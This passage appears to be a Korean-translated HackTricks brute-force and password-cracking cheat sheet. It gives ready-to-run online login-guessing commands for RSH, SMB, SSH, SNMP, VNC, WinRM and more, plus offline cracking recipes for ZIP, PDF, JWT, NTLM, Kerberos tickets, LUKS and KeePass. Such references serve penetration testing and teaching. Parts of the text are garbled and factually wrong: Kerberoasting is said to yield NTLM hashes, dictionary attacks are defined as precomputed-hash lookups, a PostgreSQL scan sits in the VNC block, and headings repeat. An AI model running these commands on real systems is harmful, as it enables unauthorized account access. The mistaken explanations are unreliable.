Rsh (Remote Shell) is a brute-force attack that targets the RSH service. Attackers attempt to guess usernames and passwords to gain unauthorized access to a remote system. This attack can be mitigated by using strong, unique passwords and implementing account lockout policies.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol)는 네트워크를 통해 미디어를 전송하기 위한 제어 프로토콜입니다. RTP(Real-time Transport Protocol)와 함께 사용되며, IP 네트워크 상에서 오디오, 비디오 또는 기타 데이터를 실시간으로 전송하는 데 사용됩니다.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP(Simple Mail Transfer Protocol)은 전자 메일을 전송하기 위한 표준 프로토콜입니다. 호스트 간 메일 전송을 담당하며, 주로 포트 25를 사용합니다.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

### SOCKS
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server는 Microsoft에서 개발한 관계형 데이터베이스 관리 시스템(RDBMS)입니다. SQL Server에 대한 브루트 포스 공격은 다양한 도구를 사용하여 로그인 자격 증명을 얻기 위해 사용될 수 있습니다. 일반적으로 관리자 암호 또는 사용자 암호를 찾기 위해 사용됩니다.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

### SSH
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### 약한 SSH 키 / Debian 예측 가능 PRNG

일부 시스템에는 암호화 자료를 생성하는 데 사용된 난수 시드에 알려진 결함이 있습니다. 이는 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)와 같은 도구를 사용하여 브루트포스로 해독될 수 있는 키 공간이 급격히 축소될 수 있습니다. 또한 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)와 같이 약한 키의 사전 생성된 세트도 사용할 수 있습니다.

### STOMP (ActiveMQ, RabbitMQ, HornetQ 및 OpenMQ)

STOMP 텍스트 프로토콜은 RabbitMQ, ActiveMQ, HornetQ 및 OpenMQ와 같은 인기있는 메시지 큐 서비스와의 원활한 통신 및 상호 작용을 허용합니다. 이는 메시지를 교환하고 다양한 메시징 작업을 수행하는 표준화된 효율적인 접근 방식을 제공합니다.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### 텔넷
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC은 가상 네트워크 컴퓨팅을 위한 프로토콜이다. VNC 서버에 대한 브루트 포스 공격은 일반적으로 사용자명과 암호를 추측하기 위해 사용된다. 이를 통해 공격자는 시스템에 액세스할 수 있게 된다.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축** 및 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 로컬

### 온라인 해독 데이터베이스

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 및 SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP 및 임의의 challenge 값)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (해시, WPA2 캡처 및 아카이브 MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (해시)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (해시 및 파일 해시)
* [https://hashes.org/search.php](https://hashes.org/search.php) (해시)
* [https://www.cmd5.org/](https://www.cmd5.org) (해시)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

해시를 무차별 대입하기 전에 이것을 확인하세요.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 알려진 평문 zip 공격

암호화된 zip 파일 내부에 포함된 파일의 **평문** (또는 일부 평문)을 알아야 합니다. 암호화된 zip 파일 내부에 포함된 파일의 **파일 이름 및 파일 크기를 확인**하려면 **`7z l encrypted.zip`**을 실행할 수 있습니다. [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)을 릴리스 페이지에서 다운로드하세요.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

PDF 파일은 종종 암호화되어 있어서 직접적인 편집이 어려울 수 있습니다. PDF 파일의 암호를 해독하기 위해 브루트 포스 공격을 사용할 수 있습니다. 이는 가능한 모든 암호 조합을 시도하여 올바른 암호를 찾는 공격 방법입니다. 이를 통해 PDF 파일의 암호를 해독할 수 있지만, 시간이 많이 소요될 수 있습니다.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF 소유자 암호

PDF 소유자 암호를 해독하려면 다음을 확인하십시오: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM 크래킹
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting은 암호화된 서비스 계정의 암호를 추측하기 위해 사용되는 기술입니다. 이 기술은 암호화된 서비스 계정의 NTLM 해시를 획득하고 이를 오프라인으로 공격하여 암호를 추출하는 과정을 포함합니다. Keberoasting은 주로 Active Directory 환경에서 사용되며, 암호화된 서비스 계정의 NTLM 해시를 획득하기 위해 Kerberos 서비스 티켓을 요청합니다.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks 이미지

#### 방법 1

설치: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 방법 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
다른 Luks BF 튜토리얼: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG 개인 키
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)를 사용한 다음 john을 사용합니다.

### Open Office Pwd Protected Column

만약 비밀번호로 보호된 열이 있는 xlsx 파일이 있다면 다음을 사용하여 보호를 해제할 수 있습니다:

* **Google 드라이브에 업로드**하면 비밀번호가 자동으로 제거됩니다
* 수동으로 **제거**하려면:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX 인증서
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 도구

**해시 예시:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### 해시 식별자
```bash
hash-identifier
> <HASH>
```
### 워드리스트

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **워드리스트 생성 도구**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 구성 가능한 기본 문자, 키맵 및 경로를 가진 고급 키보드 워크 생성기.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John 변이

_**/etc/john/john.conf**_을 읽고 구성하세요.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat 공격

* **워드리스트 공격** (`-a 0`) with rules

**Hashcat**은 이미 **규칙이 포함된 폴더**가 함께 제공되지만 [**다른 흥미로운 규칙을 여기에서 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **워드리스트 조합** 공격

해시캣을 사용하여 2개의 워드리스트를 **1개로 결합**할 수 있습니다.\
첫 번째 리스트에는 **"hello"**라는 단어가 포함되어 있고, 두 번째 리스트에는 **"world"**와 **"earth"**라는 단어가 각각 2줄씩 포함되어 있다고 가정해보겠습니다. `helloworld`와 `helloearth` 단어가 생성됩니다.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **마스크 공격** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* 워드리스트 + 마스크 (`-a 6`) / 마스크 + 워드리스트 (`-a 7`) 공격
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat 모드
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Linux 해시 크래킹 - /etc/shadow 파일

리눅스 시스템에서 사용자 계정의 암호는 `/etc/shadow` 파일에 해시로 저장됩니다. 이 파일은 루트 권한으로만 열람할 수 있으며, 암호화된 형태로 사용자 암호를 저장합니다. 해시 크래킹은 암호 해시를 분석하여 원래 암호를 찾아내는 과정을 말합니다. 이를 통해 사용자 암호를 무단으로 알아낼 수 있습니다.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# 브루트 포스

브루트 포스는 모든 가능한 조합을 시도하여 암호를 찾는 공격 기술입니다. 이 기술은 일반적으로 해시된 비밀번호를 해독하는 데 사용됩니다. Windows 운영 체제에서는 NTLM 해시를 사용하여 비밀번호를 저장하므로 브루트 포스를 사용하여 Windows 해시를 깰 수 있습니다.

## 브루트 포스 도구

- **John the Ripper**: 다양한 해시 및 암호 형식을 지원하는 인기 있는 브루트 포스 도구입니다.
- **Hashcat**: CPU 및 GPU를 사용하여 빠르게 브루트 포스 공격을 수행하는 데 사용되는 도구입니다.

## 브루트 포스 공격 단계

1. **대상 식별**: 브루트 포스로 공격할 대상을 선택합니다.
2. **암호화된 해시 획득**: 대상의 암호화된 해시를 획득합니다.
3. **암호 해독**: 브루트 포스 도구를 사용하여 모든 가능한 조합을 시도하여 암호를 찾습니다.
4. **암호 교체**: 성공적으로 암호를 찾으면 해당 암호로 대상에 로그인하여 접근합니다.

브루트 포스는 강력한 도구이지만 시간이 많이 소요되고, 성공을 보장하지는 않습니다.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# 빈도 높은 응용 프로그램 해시 크래킹

해시 크래킹은 일반적으로 무차별 대입 공격을 사용하여 해시를 해독하는 프로세스입니다. 이 기술은 주로 패스워드와 같은 민감한 정보를 찾는 데 사용됩니다. 일반적인 응용 프로그램 해시를 크래킹하는 데 사용되는 몇 가지 일반적인 방법은 다음과 같습니다.

## 무차별 대입 공격

무차별 대입 공격은 가능한 모든 조합을 시도하여 해시를 일치시키는 공격입니다. 이는 비밀번호 크래킹에 매우 효과적일 수 있습니다.

## 사전 공격

사전 공격은 미리 계산된 해시를 사용하여 일치하는 해시를 찾는 공격입니다. 이를 통해 시간을 절약할 수 있습니다.

## 레인보우 테이블

레인보우 테이블은 미리 계산된 해시 체인을 사용하여 해시를 빠르게 해독하는 데 사용됩니다. 이는 사전 공격과 유사하지만 더 효율적입니다.

이러한 방법은 해시 크래킹에 널리 사용되며, 보안 전문가는 이러한 기술을 이해하고 방어하는 방법을 알아야 합니다.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 제로부터 영웅까지 AWS 해킹을 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 팔로우하세요**.**
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급**한 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
